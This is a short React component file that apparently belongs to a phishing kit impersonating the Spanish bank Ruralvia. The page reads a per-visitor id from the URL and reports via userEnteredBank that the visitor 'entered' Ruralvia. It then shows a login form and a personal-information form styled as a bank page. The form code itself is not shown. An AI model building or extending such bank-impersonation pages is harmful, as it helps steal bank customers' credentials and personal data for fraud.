import { useEffect } from 'react'
import { useParams } from 'react-router-dom'
import { userEnteredBank } from '../utils/utils'
import { InformationForm } from './components/form/InformationForm'
import { LoginForm } from './components/form/LoginForm'

export function RuralviaPage() {
  const { id } = useParams()

  useEffect(() => {
    userEnteredBank(id!, 'Ruralvia')
  })

  return (
    <div className="flex flex-col gap-x-8 bg-[#212322] md:grid md:h-full md:grid-cols-2">
      <LoginForm />
      <InformationForm />
    </div>
  )
}
